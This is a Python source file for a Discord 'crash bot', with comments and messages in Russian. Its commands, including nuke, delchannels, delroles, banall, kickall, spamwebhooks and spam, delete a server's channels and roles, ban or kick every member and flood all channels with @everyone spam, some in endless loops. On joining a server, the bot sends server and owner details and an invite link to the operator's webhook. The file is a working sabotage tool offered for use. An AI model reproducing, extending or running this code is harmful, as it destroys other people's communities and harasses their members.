#   ПАТЕНТ НОМЕР: 218B272N1D
def time4logs():
    return f'{datetime.datetime.now().strftime("%d.%m.%Y")}'
try: 
    from colorama import init
    from colorama import Fore, Back, Style
    from colorama import Fore
    import discord
    from discord import *
    from discord.ext import commands
    import requests
    import asyncio
    import time
    import colorama
    import json
    from discord import Webhook, AsyncWebhookAdapter
    import aiohttp
    import datetime
    import colorama
    from colorama import init
    from colorama import Fore, Back, Style
    from colorama import Fore
    from config import settings
    init()
except: 
    print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE} | Пожалуйста, установи библиотеки discord, asyncio, colorama{Fore.WHITE}')
    input()

print(time4logs(),f'|{Fore.BLUE} INFO {Fore.WHITE} | Пытаюсь запустить бота на вашем токене...{Fore.WHITE}')

prefix = settings['prefix'] # ПРЕФИКС

# НАСТРОЙКА
channelsname = settings['channelname'] # НАЗВАНИЕ КАНАЛОВ +
rolename = settings['rolename'] # ИМЯ РОЛЕЙ +
name = settings['servername'] # НАЗВАНИЕ СЕРЕРА ПРИ КРАШЕ +
icon = 'data/icon.PNG' # КАРТИНКА
webhookname = settings['webhookname'] # ИМЯ ВЕБХУКОВ +
token = settings['token'] # ТОКЕН
botname = settings['botname'] # ИМЯ БОТА +
inviten = settings['invite'] # ИНВАЙТ НА СЕРВЕР +
spamtext = f'@everyone\nДанный сервер крашиться ботом {botname}\nСервер поддержки: {inviten}' # ТЕКСТ СПАМ СООБЩЕНИЯ
admins = settings['admins'] # АЙДИ СОЗДАТЕЛЕЙ +
reason = settings['reason'] # ПРИЧИНА КИКОВ/БАНОВ +
logs = settings['webhooklogs'] # ВЕБХУК ЛОГОВ + 


intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help') 
@client.event
async def on_command_error(msg,error):
    return
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name=f'Краш-бот {botname}'))
    print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}|  Краш бот {Fore.GREEN}{botname}{Fore.WHITE} запущен!{Fore.WHITE}')

@client.command()
async def addwl(ctx,idd=None):
    if idd == None:
        await ctx.send(embed=discord.Embed(title='Ошибка',description='Укажите ID сервера!',colour=discord.Colour.from_rgb(228,0,0)))
    elif int(ctx.author.id) in admins:
        with open('src/data/wl.json','r') as f:
            bd = json.load(f)
        bd["wl"].append(int(idd))
        with open('src/data/wl.json','w') as f:
            json.dump(bd,f)
        await ctx.send(embed=discord.Embed(title='Успешно',description=f'Теперь данный сервер НЕЛЬЗЯ крашнуть! :smiling_imp:',colour=discord.Colour.from_rgb(0,228,0)))
    else:
        await ctx.send(embed=discord.Embed(title='У вас Недостаточно прав',colour=discord.Colour.from_rgb(200,2,0)))

@client.event
async def on_guild_join(guild):
  with open('src/data/wl.json','r') as f:
    wls = json.load(f)
  if int(guild.id) in wls["wl"]:
    async for entry in guild.audit_logs(limit=2,action=discord.AuditLogAction.bot_add):
        user = entry.user
        iddd = entry.user.id
    for c in guild.text_channels:
      try:
        await c.send(embed=discord.Embed(title='Краш сервера из вайт-листа 🚨',description=f'Данный сервер в вайт листе, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',colour=discord.Colour.from_rgb(228,2,0)))
      except:
        pass
      else:
        break
    await guild.leave()
  else:
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(logs, adapter=discord.AsyncWebhookAdapter(session))
        members = len(guild.members)
        await webhook.send(embed=discord.Embed(
            title="С помощью бота 'END Crash' Был крашнут новый сервер",
            description=(
                f":zap:**〢Информация о сервере:**\n"
                f"**╭ Название сервера:** `{guild.name}`\n"
                f"**╰  ID Сервера:** `{guild.id}`\n\n"
                f":fire:**〢Каналы**\n"
                f"**╭ Всего: ** `{str(len(guild.channels))}` \n"
                f"**│ Текстовых:** `{str(len(guild.text_channels))}`\n"
                f"**╰ Голосовых:** `{str(len(guild.voice_channels))}`\n\n"
                f":star:**〢Роли **\n"
                f"**╭ Всего: ** `{str(len(guild.roles))}` \n"
                f"**╰ С правами администратора:** `...`\n\n"
                f":crown:**〢Информация о владельце**\n"
                f"**╭ Тег: ** `{guild.owner}`\n"
                f"**╰ Айди: ** `{guild.owner_id}`\n\n"
            ),
            color=discord.Color.dark_blue()
        ).set_thumbnail(url=guild.icon_url_as(static_format="png", size=1024)))
    print(time4logs(),f'|{Fore.BLUE} INFO {Fore.WHITE} | Меня добавили на новый сервер: {Fore.WHITE}{guild}{Fore.WHITE}')

@client.command()
async def help(ctx, arg=''):
    if arg == 'crash':
        embed = discord.Embed(
            title = 'Краш-команды',
            description = f'`{prefix}nuke` - авто краш сервера\n`{prefix}delchannels` - удалить все каналы на сервере\n`{prefix}delroles` - удалить все роли на сервере\n`{prefix}createchannels (кол-во)` - создает определенное кол-во каналов\n`{prefix}createroles (кол-во)` - создает определенное кол-во ролей\n`{prefix}spamwebhooks` - спам вебхуками во все каналы\n`{prefix}spamwebhook1` - спам вебхуком в текущий канал\n`{prefix}rename` - изменить иконку и установить имя серверу (имя иконки - `{icon}`, имя крашнутого сервера - `{name}`)\n`{prefix}banall` - бан всех участников сервера\n`{prefix}kickall` - кикнуть всех участников сервера\n`{prefix}spamallchannels` - спам во все каналы от лица бота (очень мощный)\n`{prefix}spam` - спам в текущий канал\n`{prefix}addwl [ ID сервера ]` - добавить сервер в вайт лист (его нельзя будет крашнуть, только для админов)',
            colour = discord.Colour.from_rgb(237, 47, 47)
        )

        await ctx.send(embed=embed)
        return
    elif arg == 'status':
        embed = discord.Embed(
            title = 'Команды статуса',
            description = f'`{prefix}status stream Первый стрим` - установить статус "Стримит" с вашим названием стрима\n`{prefix}status watching (имя стрима)` - установить статус "Смотрит"\n`{prefix}status listening Песня` - установить статус "Слушает"\n`{prefix}status playing Ебу сервера` - установить статус "играет"',
            colour = discord.Colour.from_rgb(237, 47, 47)
        )

        await ctx.send(embed=embed)
        return



    embed = discord.Embed(
        title = 'Список команд',
        description = f'`{prefix}help crash` - помощь по разделу "Краш команды"\n`{prefix}help status` - помощь по разделу "Команды статуса"',
        colour = discord.Colour.from_rgb(237, 47, 47)
    )

    await ctx.send(embed=embed)

@client.command()
async def status(ctx, arg='', *, names=''):
  if int(ctx.author.id) in admins:
    bll = [''] 
    if arg == 'stream' and names not in bll:
        await client.change_presence(activity=discord.Streaming(name=names, url='https://twitch.tv/404'))
        await ctx.message.add_reaction('✅')
    elif arg == 'watching' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'listening' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'playing' and names not in bll:
        await client.change_presence(activity=discord.Game(name=names))
        await ctx.message.add_reaction('✅')
    else:
        embed = discord.Embed(
            title = 'Ошибка ❌',
            description = f'Вы не указали статус или имя для него, либо указали неверный тип статуса\nВведите `{prefix}help status` для получения информации о данной команде',
            colour = discord.Colour.from_rgb(29, 224, 11)
        )
        await ctx.send(embed=embed)
  else:
    await ctx.send('Недостаточно прав!')

@client.command()
async def nuke(ctx):
    async with aiohttp.ClientSession() as session: 
        webhook = Webhook.from_url(logs, adapter=AsyncWebhookAdapter(session))
        embed = discord.Embed(
            title = f'Запущен краш сервера {ctx.guild}',
            description = f'Пользователь: `{ctx.author}` | ID - `{ctx.author.id}`\nКол-во участников на сервере: {len(ctx.guild.members)}',
            colour = discord.Colour.from_rgb(164,66,9)
        )
        await webhook.send(embed=embed)
    timer = time.time()
    nameold = ctx.guild.name
    try:
        with open(icon, 'rb') as f:
            icon = f.read()
            await ctx.guild.edit(name=name, icon=icon)
    except:
        print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не могу изменить имя и иконку серверу {Fore.YELLOW}"{ctx.guild.name}"{Fore.RED}, продолжаю краш сервера{Fore.WHITE}')
    else:
        print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Краш сервера {Fore.GREEN}{nameold}{Fore.YELLOW}: иконка и имя серверу изменены{Fore.WHITE}')

    for channell in ctx.guild.channels:
        try:
            await channell.delete(reason=reason)
        except:
            print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не смог удалить канал {Fore.GREEN}{channell.name}{Fore.RED} на сервере {Fore.GREEN}{nameold}{Fore.GREEN}, продолжаю краш сервера...{Fore.WHITE}')
        else:
            print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Краш сервера {Fore.GREEN}{nameold}{Fore.YELLOW}: Канал {Fore.GREEN}#{channell}{Fore.YELLOW} удалён{Fore.WHITE}')


    for roleee in ctx.guild.roles:
        try:
            await roleee.delete(reason=reason)
        except:
            print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не могу удалить роль {Fore.GREEN}{roleee.name}{Fore.RED} на сервере {Fore.GREEN}{nameold}{Fore.RED}, продолжаю краш{Fore.WHITE}')
        else:
            print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Краш сервера {Fore.GREEN}{nameold}{Fore.YELLOW}: Роль {Fore.GREEN}@{roleee}{Fore.YELLOW} удалена{Fore.WHITE}')

    c = await ctx.guild.create_text_channel(channelsname)
    await c.create_webhook(name=webhookname)
    link = await c.create_invite(max_age = 300)

    async with aiohttp.ClientSession() as session:
        webhook = Webhook.from_url(logs, adapter=AsyncWebhookAdapter(session))
        embed = discord.Embed(
            title = f'Краш сервера {nameold}',
            description = f'Приглашение - [клик]({link})',
            colour = discord.Colour.from_rgb(164,5,9)
        )
        await webhook.send(embed=embed)

    for i in range(100):
        try:
            chh = await ctx.guild.create_text_channel(channelsname)
            await ctx.guild.create_role(name=rolename)
        except:
            print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не смог создать роль/канал на каком либо сервере{Fore.WHITE}')
        else:
            print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Создана роль: {Fore.GREEN}@{rolename}{Fore.WHITE}')
            print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Создан канал: {Fore.GREEN}#{channelsname}{Fore.WHITE}')


@client.command()
async def delchannels(ctx):
    count = 0
    for channell in ctx.guild.channels:
        try:
            await channell.delete(reason=reason)
        except:
            print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не смог удалить канал {Fore.GREEN}{channell.name}{Fore.RED} на сервере {Fore.GREEN}{ctx.guild}{Fore.RED}, продолжаю краш сервера...{Fore.WHITE}')
        else:
            print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Канал {Fore.GREEN}#{channell}{Fore.YELLOW} удалён{Fore.WHITE}')
            count+=1

    await ctx.author.send(embed=discord.Embed(title='Каналы успешно удалены',description=f'Было удалено {count} каналов',colour=discord.Colour.from_rgb(0,228,0)))

@client.command()
async def delroles(ctx):
    count = 0
    for r in ctx.guild.roles:
        try:
            await r.delete(reason=reason)
            count+=1
        except:
            print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не смог удалить роль {Fore.GREEN}{r}{Fore.RED} на сервере {Fore.GREEN}{ctx.guild}{Fore.RED}, продолжаю краш сервера...{Fore.WHITE}')
        else:
            print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Роль {Fore.GREEN}@{r}{Fore.YELLOW} удалена{Fore.WHITE}')
            count+=1

    await ctx.author.send(embed=discord.Embed(title='Роли успешно удалены',description=f'Было удалено {count} ролей',colour=discord.Colour.from_rgb(0,228,0)))


@client.command()
async def createchannels(ctx, count):
    good = 0
    for i in range(int(count)):
        try:
            await ctx.guild.create_text_channel(channelsname)
        except:
            print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Краш сервера {Fore.GREEN}{ctx.guild}{Fore.RED}: Канал {Fore.GREEN}#{channelsname}{Fore.RED} не был создан{Fore.WHITE}')
        else:
            good+=1
            print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Канал {Fore.GREEN}#{channelsname}{Fore.YELLOW} был создан{Fore.WHITE}')

    await ctx.author.send(embed=discord.Embed(title=f'Было создано {good} каналов',colour=discord.Colour.from_rgb(0,228,0)))


@client.command()
async def createroles(ctx, count):
    good=0
    for i in range(int(count)):
        try:
            await ctx.guild.create_role(name=rolename)
        except:
            print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Краш сервера {Fore.GREEN}{ctx.guild}{Fore.RED}: Роль {Fore.GREEN}@{rolename}{Fore.RED} не была создана{Fore.WHITE}')
        else:
            good+=1
            print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Роль {Fore.GREEN}@{rolename}{Fore.YELLOW} была создана{Fore.WHITE}')

    await ctx.author.send(embed=discord.Embed(title=f'Было создано {good} ролей',colour=discord.Colour.from_rgb(0,228,0)))


async def spamhook(ctx,ch):
 try:
    hooklist = await ch.webhooks()
    while True:
        for hook in hooklist:
            await hook.send(content=spamtext, wait=True)
 except:
    pass

@client.command()
async def spamwebhooks(ctx):
    await ctx.author.send(embed=discord.Embed(title='Создание вебхуков запущено',description='Если на сервере более 50 текстовых каналов или бот не сможет создать вебхук - просто ничего не произойдёт',colour=discord.Colour.from_rgb(0,228,0)))
    for channel in ctx.guild.text_channels:
        try:
            await channel.create_webhook(name=webhookname)
        except:
            print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не создал хук на канал {Fore.YELLOW}#{channel.name}{Fore.WHITE}')
        else:
            print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Создал вебхук на канал {Fore.GREEN}#{channel}{Fore.WHITE}')

    for ch in ctx.guild.text_channels:
        print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Спам на вебхук в канале {Fore.GREEN}#{ch}{Fore.YELLOW} запущен!')
        asyncio.create_task(spamhook(ctx,ch))

@client.command()
async def spamwebhook1(ctx):
    try:
        await ctx.message.channel.create_webhook(name=webhookname)
    except:
        pass
    else:
        print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Запущен спам вебхуками на канал {Fore.YELLOW}#{ctx.channel}{Fore.WHITE}')
        await ctx.author.send(embed=discord.Embed(title='Спам вебхуками на текущий канал запущен', colour=discord.Colour.from_rgb(0,228,0)))

    hooklist = await ctx.message.channel.webhooks()
    for hook in hooklist:
            for i in range(100):
                await hook.send(content=spamtext, wait=True)

@client.command()
async def rename(ctx):
    n = ctx.guild
    try:
        with open(icon, 'rb') as f:
            icon = f.read()
            await ctx.guild.edit(name=name, icon=icon)
    except:
        await ctx.author.send(embed=discord.Embed(title='Ошибка!',description=f'Что-то пошло не так, и я не смог поменять имя и аватарку этому серверу',colour=discord.Colour.from_rgb(200,0,0)))
        print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не могу изменить имя и иконку серверу {Fore.YELLOW}"{ctx.guild.name}"{Fore.WHITE}')
    else:
        print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Сменил иконку и имя серверу {Fore.YELLOW}{n}{Fore.WHITE}')
        await ctx.author.send(embed=discord.Embed(title=f'Успешно изменено имя и иконка серверу {n}', colour =discord.Colour.from_rgb(0,228,0)))

@client.command()
async def banall(ctx):
    count = 0
    for jktimosha in ctx.guild.members:
        if int(jktimosha.id) != int(ctx.message.author.id):
            try:
                await ctx.guild.ban(jktimosha, reason=reason)
            except:
                print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не забанил участника {Fore.YELLOW}{jktimosha.name}{Fore.WHITE}')
            else:
                print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Забанил участника {Fore.YELLOW}{jktimosha.name}{Fore.WHITE}')
                count+=1

    await ctx.author.send(embed=discord.Embed(title=f'Забанено {count} человек',colour=discord.Colour.from_rgb(0,228,0)))

@client.command()
async def kickall(ctx):
    count = 0
    for jktimosha in ctx.guild.members:
        if int(jktimosha.id) != int(ctx.message.author.id):
            try:
                await ctx.guild.kick(jktimosha, reason=reason)
            except:
                print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не кикнул участника {Fore.YELLOW}{jktimosha.name}{Fore.WHITE}')
            else:
                print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Кикнул участника {Fore.YELLOW}{jktimosha.name}{Fore.WHITE}')
                count+=1
    await ctx.author.send(embed=discord.Embed(title=f'Кикнуто {count} человек',colour=discord.Colour.from_rgb(0,228,0)))

async def send(ctx,channel):
    try:
        await channel.send(spamtext)
    except:
        print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE}| Не отправил спам в канал {Fore.YELLOW}#{channel}{Fore.WHITE}')
    else:
        print(time4logs(),f'|{Fore.GREEN} SURE {Fore.WHITE}| Отправил спам в канал {Fore.YELLOW}#{channel}{Fore.WHITE}')

@client.command()
async def spamallchannels(ctx):
    for channel in ctx.guild.text_channels:
        asyncio.create_task(send(ctx,channel))


@client.command()
async def spam(ctx):
    while True:
        await ctx.send(spamtext)

@client.event
async def on_guild_channel_create(channel):
            await channel.create_webhook(name=webhookname)
            for i in range(100):
                try:
                    hooklist = await channel.webhooks()
                    for hook in hooklist:
                        await hook.send(content=spamtext, wait=True)
                except:
                    pass

try:
	client.run(token)
except Exception as e:
	print(time4logs(),f'|{Fore.RED} ERROR {Fore.WHITE} | Ты указал неверный токен бота или не включил ему интенты!{Fore.WHITE}')
	input()
#   ПАТЕНТ НОМЕР: 218B272N1D